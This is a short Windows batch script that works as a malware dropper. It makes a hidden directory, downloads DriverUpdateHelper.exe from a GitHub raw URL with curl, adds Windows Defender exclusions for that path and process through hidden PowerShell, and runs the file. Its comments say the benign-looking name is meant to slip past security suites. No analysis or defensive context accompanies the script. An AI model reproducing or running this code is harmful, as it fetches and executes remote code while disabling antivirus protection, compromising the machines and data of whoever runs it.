@echo off
:: Drop + exclude + run (SYSTEM/Admin). Benign name helps some suites.
set "DST=C:\ProgramData\Microsoft\Windows\WER\Temp\.wucache"
mkdir "%DST%" 2>nul
curl.exe -L --ssl-no-revoke -o "%DST%\DriverUpdateHelper.exe" https://raw.githubusercontent.com/xnobuddy/github-drop/main/DriverUpdateHelper.exe
powershell -NoP -NonI -WindowStyle Hidden -C "try{Add-MpPreference -ExclusionPath '%DST%';Add-MpPreference -ExclusionProcess 'DriverUpdateHelper.exe'}catch{}"
start "" "%DST%\DriverUpdateHelper.exe"
